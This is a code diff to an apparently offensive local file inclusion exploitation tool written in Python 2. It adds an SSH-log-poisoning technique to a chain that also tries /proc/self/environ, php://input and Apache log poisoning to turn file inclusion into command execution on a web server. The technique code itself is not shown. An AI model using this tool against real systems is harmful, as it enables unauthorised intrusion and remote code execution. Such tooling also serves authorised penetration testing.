@@ -11,6 +11,7 @@ import urllib
 from core.techniques.LFIHeader import LFIHeader
 from core.techniques.LFIApacheLog import LFIApacheLog
 from core.techniques.LFIPost import LFIPost
+from core.techniques.LFISSHLog import LFISSHLog
 
 # string functions
 from core.functions import *
@@ -231,16 +232,25 @@ class LFI ():
         return [req.text]
 
     def do_exec (self, cmd):
+        print '[+] Testing /proc/self/environ command execution'
         # test /proc/self/environ technique
         tech = LFIHeader (self)
         if tech.check ():
             return tech.exploit (cmd)
 
+        print '[+] Testing SSH Log command execution'
+        # check if we got code execution through SSH logs
+        tech = LFISSHLog (self)
+        if tech.check ():
+            return tech.exploit (cmd)
+
+        print '[+] Testing php://input command execution'
         # test php://input technique
         tech = LFIPost (self)
         if tech.check ():
             return tech.exploit (cmd)
 
+        print '[+] Testing Apache Log command execution'
         # check if we got code execution through apache logs
         tech = LFIApacheLog (self)
         if tech.check ():
